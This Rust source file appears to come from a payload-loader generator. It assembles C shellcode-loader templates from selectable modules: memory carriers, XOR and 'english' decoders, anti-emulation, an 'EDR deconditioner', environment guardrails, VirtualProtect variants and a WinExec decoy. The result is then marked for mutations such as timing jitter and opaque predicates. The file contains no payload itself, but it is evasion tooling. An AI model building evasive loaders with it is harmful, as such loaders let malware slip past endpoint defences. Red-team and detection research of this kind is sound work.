//! Template Assembler
//!
//! Assembles modular C templates by replacing @MODULE markers with selected module code.
//! First phase of the build pipeline: assembler replaces @MODULE markers into a single .c
//! file, then the AST mutator transforms @MUTATE markers, and finally the compiler
//! produces the final artifact.

use anyhow::{Context, Result, bail};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use tracing::{debug, info};

/// Module selection for artifact assembly
#[derive(Debug, Clone, Default)]
pub struct ModuleSelection {
    /// Carrier module: "alloc_rw_rx", "change_rw_rx", "peb_walk"
    pub carrier: String,
    /// Decoder module: "xor", "english"
    pub decoder: String,
    /// Anti-emulation module: "none", "sirallocalot", "timeraw"
    pub antiemulation: String,
    /// EDR deconditioner module: "none", "alloc_loop"
    pub deconditioner: String,
    /// Guardrail module: "none", "env"
    pub guardrail: String,
    /// VirtualProtect module: "standard", "undersized"
    pub virtualprotect: String,
    /// Decoy module: "none", "winexec"
    pub decoy: String,
}

impl ModuleSelection {
    /// Create a new module selection with defaults
    pub fn new() -> Self {
        Self {
            carrier: "alloc_rw_rx".to_string(),
            decoder: "xor".to_string(),
            antiemulation: "none".to_string(),
            deconditioner: "none".to_string(),
            guardrail: "none".to_string(),
            virtualprotect: "standard".to_string(),
            decoy: "none".to_string(),
        }
    }

    /// Validate that all selected modules exist
    pub fn validate(&self, template_dir: &Path) -> Result<()> {
        let modules_dir = template_dir.join("modules");

        let checks = [
            (
                "carrier",
                &self.carrier,
                modules_dir
                    .join("carrier")
                    .join(format!("{}.c", self.carrier)),
            ),
            (
                "decoder",
                &self.decoder,
                modules_dir
                    .join("decoder")
                    .join(format!("{}.c", self.decoder)),
            ),
            (
                "antiemulation",
                &self.antiemulation,
                modules_dir
                    .join("antiemulation")
                    .join(format!("{}.c", self.antiemulation)),
            ),
            (
                "deconditioner",
                &self.deconditioner,
                modules_dir
                    .join("deconditioner")
                    .join(format!("{}.c", self.deconditioner)),
            ),
            (
                "guardrail",
                &self.guardrail,
                modules_dir
                    .join("guardrails")
                    .join(format!("{}.c", self.guardrail)),
            ),
            (
                "virtualprotect",
                &self.virtualprotect,
                modules_dir
                    .join("virtualprotect")
                    .join(format!("{}.c", self.virtualprotect)),
            ),
            (
                "decoy",
                &self.decoy,
                modules_dir.join("decoy").join(format!("{}.c", self.decoy)),
            ),
        ];

        for (category, name, path) in checks {
            if !path.exists() {
                bail!("Module not found: {} '{}' at {:?}", category, name, path);
            }
        }

        Ok(())
    }
}

/// Template assembler that combines modules into a single source file
pub struct Assembler {
    /// Path to template directory
    template_dir: PathBuf,
    /// Cache of loaded module contents
    module_cache: HashMap<String, String>,
}

impl Assembler {
    /// Create a new assembler with the given template directory
    pub fn new(template_dir: impl AsRef<Path>) -> Result<Self> {
        let template_dir = template_dir.as_ref().to_path_buf();

        if !template_dir.exists() {
            bail!("Template directory does not exist: {:?}", template_dir);
        }

        Ok(Self {
            template_dir,
            module_cache: HashMap::new(),
        })
    }

    /// Assemble a complete source file from the template and selected modules.
    ///
    /// Each module replacement is wrapped with boundary comments:
    /// `// --- BEGIN MODULE: <category> ---` / `// --- END MODULE: <category> ---`
    /// These enable `strip_markers_outside_targets()` to scope mutations.
    pub fn assemble(&mut self, modules: &ModuleSelection, payload_code: &str) -> Result<String> {
        // Validate module selection
        modules.validate(&self.template_dir)?;

        // Read the main template
        let template_path = self.template_dir.join("loader_template.c");
        let template = std::fs::read_to_string(&template_path)
            .with_context(|| format!("Failed to read template: {:?}", template_path))?;

        info!(
            carrier = %modules.carrier,
            decoder = %modules.decoder,
            antiemulation = %modules.antiemulation,
            deconditioner = %modules.deconditioner,
            guardrail = %modules.guardrail,
            virtualprotect = %modules.virtualprotect,
            decoy = %modules.decoy,
            "Assembling artifact with modules"
        );

        // Replace @MODULE markers with module content wrapped in boundary comments
        let output = template
            .replace("// @MODULE:payload", &wrap_module("payload", payload_code))
            .replace(
                "// @MODULE:definitions",
                &wrap_module("definitions", &self.read_module("header/definitions.h")?),
            )
            .replace(
                "// @MODULE:decoder",
                &wrap_module(
                    "decoder",
                    &self.read_module(&format!("decoder/{}.c", modules.decoder))?,
                ),
            )
            .replace(
                "// @MODULE:virtualprotect",
                &wrap_module(
                    "virtualprotect",
                    &self.read_module(&format!("virtualprotect/{}.c", modules.virtualprotect))?,
                ),
            )
            .replace(
                "// @MODULE:antiemulation",
                &wrap_module(
                    "antiemulation",
                    &self.read_module(&format!("antiemulation/{}.c", modules.antiemulation))?,
                ),
            )
            .replace(
                "// @MODULE:deconditioner",
                &wrap_module(
                    "deconditioner",
                    &self.read_module(&format!("deconditioner/{}.c", modules.deconditioner))?,
                ),
            )
            .replace(
                "// @MODULE:guardrail",
                &wrap_module(
                    "guardrail",
                    &self.read_module(&format!("guardrails/{}.c", modules.guardrail))?,
                ),
            )
            .replace(
                "// @MODULE:decoy",
                &wrap_module(
                    "decoy",
                    &self.read_module(&format!("decoy/{}.c", modules.decoy))?,
                ),
            )
            .replace(
                "// @MODULE:carrier",
                &wrap_module(
                    "carrier",
                    &self.read_module(&format!("carrier/{}.c", modules.carrier))?,
                ),
            );

        debug!(output_len = output.len(), "Assembly complete");

        Ok(output)
    }

    /// Read a module file, stripping the definitions.h include (already included in template)
    fn read_module(&mut self, relative_path: &str) -> Result<String> {
        // Check cache first
        if let Some(cached) = self.module_cache.get(relative_path) {
            return Ok(cached.clone());
        }

        let full_path = self.template_dir.join("modules").join(relative_path);
        let content = std::fs::read_to_string(&full_path)
            .with_context(|| format!("Failed to read module: {:?}", full_path))?;

        // Strip the definitions.h include since it's already in the main template
        // Also strip any #include <stdio.h> as it's added at the top
        let cleaned: String = content
            .lines()
            .filter(|line| {
                let trimmed = line.trim();
                !trimmed.contains("definitions.h") && !trimmed.starts_with("#include <stdio.h>")
            })
            .collect::<Vec<_>>()
            .join("\n");

        // Cache for future use
        self.module_cache
            .insert(relative_path.to_string(), cleaned.clone());

        Ok(cleaned)
    }

    /// Get list of available modules for a category
    pub fn list_modules(&self, category: &str) -> Result<Vec<String>> {
        let dir_name = match category {
            "guardrail" => "guardrails",
            other => other,
        };

        let modules_dir = self.template_dir.join("modules").join(dir_name);

        if !modules_dir.exists() {
            bail!("Module category not found: {}", category);
        }

        let mut modules = Vec::new();
        for entry in std::fs::read_dir(&modules_dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.extension().is_some_and(|ext| ext == "c")
                && let Some(stem) = path.file_stem()
            {
                modules.push(stem.to_string_lossy().to_string());
            }
        }

        modules.sort();
        Ok(modules)
    }

    /// Clear the module cache
    pub fn clear_cache(&mut self) {
        self.module_cache.clear();
    }
}

/// Wrap module content with boundary comments for scoped mutation targeting.
fn wrap_module(category: &str, content: &str) -> String {
    format!(
        "// --- BEGIN MODULE: {} ---\n{}\n// --- END MODULE: {} ---",
        category, content, category
    )
}

/// Strip `@MUTATE` markers from lines NOT inside targeted module boundaries.
///
/// `targets` = module names to keep markers for (e.g., `["deconditioner", "carrier"]`).
/// Empty targets = keep all markers (no stripping).
/// Lines outside any module boundary (main template) are kept if `"main"` is in targets
/// or if targets is empty.
pub fn strip_markers_outside_targets(source: &str, targets: &[String]) -> String {
    if targets.is_empty() {
        return source.to_string();
    }

    let target_set: std::collections::HashSet<&str> = targets.iter().map(|s| s.as_str()).collect();
    let keep_main = target_set.contains("main");

    let mut current_module: Option<&str> = None;
    let mut result = Vec::new();

    for line in source.lines() {
        let trimmed = line.trim();

        // Track module boundaries
        if let Some(rest) = trimmed.strip_prefix("// --- BEGIN MODULE: ") {
            if let Some(name) = rest.strip_suffix(" ---") {
                current_module = Some(name);
            }
            result.push(line.to_string());
            continue;
        }
        if trimmed.starts_with("// --- END MODULE: ") {
            result.push(line.to_string());
            current_module = None;
            continue;
        }

        // Check if line contains @MUTATE marker
        if line.contains("// @MUTATE:") {
            let in_target = match current_module {
                Some(module) => target_set.contains(module),
                None => keep_main,
            };
            if !in_target {
                // Strip this marker line
                continue;
            }
        }

        result.push(line.to_string());
    }

    result.join("\n")
}

/// Extract @MUTATE markers from source code
pub fn extract_mutation_markers(source: &str) -> Vec<MutationMarker> {
    let mut markers = Vec::new();

    for (line_num, line) in source.lines().enumerate() {
        if let Some(idx) = line.find("// @MUTATE:") {
            let marker_text = &line[idx + 11..]; // Skip "// @MUTATE:"
            let marker_text = marker_text.trim();

            // Parse marker name and optional parameters
            let (name, params) = if let Some(paren_idx) = marker_text.find('(') {
                let name = &marker_text[..paren_idx];
                let params: Vec<String> = marker_text
                    .get(paren_idx + 1..marker_text.len().saturating_sub(1))
                    .unwrap_or("")
                    .split('|')
                    .map(|s| s.trim().to_string())
                    .collect();
                (name.to_string(), params)
            } else {
                (marker_text.to_string(), Vec::new())
            };

            markers.push(MutationMarker {
                name,
                params,
                line: line_num + 1, // 1-indexed
                column: idx,
            });
        }
    }

    markers
}

/// A mutation marker found in source code
#[derive(Debug, Clone)]
pub struct MutationMarker {
    /// Marker name (e.g., "timing_jitter", "api_wrapper_injection")
    pub name: String,
    /// Optional parameters (e.g., ["direct", "callback", "fiber", "threadpool"])
    pub params: Vec<String>,
    /// Line number (1-indexed)
    pub line: usize,
    /// Column position
    pub column: usize,
}

/// Strip all @MUTATE markers and module boundary comments from source code (for final compilation)
pub fn strip_mutation_markers(source: &str) -> String {
    source
        .lines()
        .filter(|line| {
            !line.contains("// @MUTATE:")
                && !line.contains("// --- BEGIN MODULE:")
                && !line.contains("// --- END MODULE:")
        })
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_selection_defaults() {
        let selection = ModuleSelection::new();
        assert_eq!(selection.carrier, "alloc_rw_rx");
        assert_eq!(selection.decoder, "xor");
        assert_eq!(selection.antiemulation, "none");
        assert_eq!(selection.deconditioner, "none");
        assert_eq!(selection.guardrail, "none");
        assert_eq!(selection.virtualprotect, "standard");
        assert_eq!(selection.decoy, "none");
    }

    #[test]
    fn test_extract_mutation_markers() {
        let source = r#"
int main() {
    // @MUTATE:timing_jitter
    // @MUTATE:execution_method(direct|callback|fiber|threadpool)
    do_something();
}
"#;
        let markers = extract_mutation_markers(source);
        assert_eq!(markers.len(), 2);
        assert_eq!(markers[0].name, "timing_jitter");
        assert!(markers[0].params.is_empty());
        assert_eq!(markers[1].name, "execution_method");
        assert_eq!(
            markers[1].params,
            vec!["direct", "callback", "fiber", "threadpool"]
        );
    }

    #[test]
    fn test_strip_mutation_markers() {
        let source = r#"int main() {
    // @MUTATE:timing_jitter
    do_something();
    // @MUTATE:opaque_predicate
    return 0;
}"#;
        let stripped = strip_mutation_markers(source);
        assert!(!stripped.contains("@MUTATE"));
        assert!(stripped.contains("do_something()"));
        assert!(stripped.contains("return 0;"));
    }

    #[test]
    fn test_strip_mutation_markers_removes_boundary_comments() {
        let source = r#"// --- BEGIN MODULE: deconditioner ---
    // @MUTATE:timing_jitter
    do_something();
// --- END MODULE: deconditioner ---
    return 0;"#;
        let stripped = strip_mutation_markers(source);
        assert!(!stripped.contains("BEGIN MODULE"));
        assert!(!stripped.contains("END MODULE"));
        assert!(!stripped.contains("@MUTATE"));
        assert!(stripped.contains("do_something()"));
        assert!(stripped.contains("return 0;"));
    }

    #[test]
    fn test_wrap_module() {
        let content = "void foo() {}";
        let wrapped = wrap_module("carrier", content);
        assert!(wrapped.starts_with("// --- BEGIN MODULE: carrier ---"));
        assert!(wrapped.contains("void foo() {}"));
        assert!(wrapped.ends_with("// --- END MODULE: carrier ---"));
    }

    #[test]
    fn test_strip_markers_outside_targets_empty_targets_keeps_all() {
        let source = r#"// @MUTATE:main_thing
// --- BEGIN MODULE: carrier ---
// @MUTATE:carrier_thing
// --- END MODULE: carrier ---"#;
        let result = strip_markers_outside_targets(source, &[]);
        assert!(result.contains("@MUTATE:main_thing"));
        assert!(result.contains("@MUTATE:carrier_thing"));
    }

    #[test]
    fn test_strip_markers_outside_targets_keeps_targeted_module() {
        let source = r#"// @MUTATE:main_thing
// --- BEGIN MODULE: carrier ---
// @MUTATE:carrier_thing
code_in_carrier();
// --- END MODULE: carrier ---
// --- BEGIN MODULE: decoder ---
// @MUTATE:decoder_thing
code_in_decoder();
// --- END MODULE: decoder ---"#;
        let result = strip_markers_outside_targets(source, &["carrier".to_string()]);
        // Main template markers stripped (not in targets, "main" not in targets)
        assert!(!result.contains("@MUTATE:main_thing"));
        // Carrier markers kept
        assert!(result.contains("@MUTATE:carrier_thing"));
        assert!(result.contains("code_in_carrier()"));
        // Decoder markers stripped
        assert!(!result.contains("@MUTATE:decoder_thing"));
        assert!(result.contains("code_in_decoder()"));
    }

    #[test]
    fn test_strip_markers_outside_targets_main_region() {
        let source = r#"// @MUTATE:main_thing
// --- BEGIN MODULE: carrier ---
// @MUTATE:carrier_thing
// --- END MODULE: carrier ---"#;
        let result = strip_markers_outside_targets(source, &["main".to_string()]);
        // Main markers kept
        assert!(result.contains("@MUTATE:main_thing"));
        // Carrier markers stripped
        assert!(!result.contains("@MUTATE:carrier_thing"));
    }
}
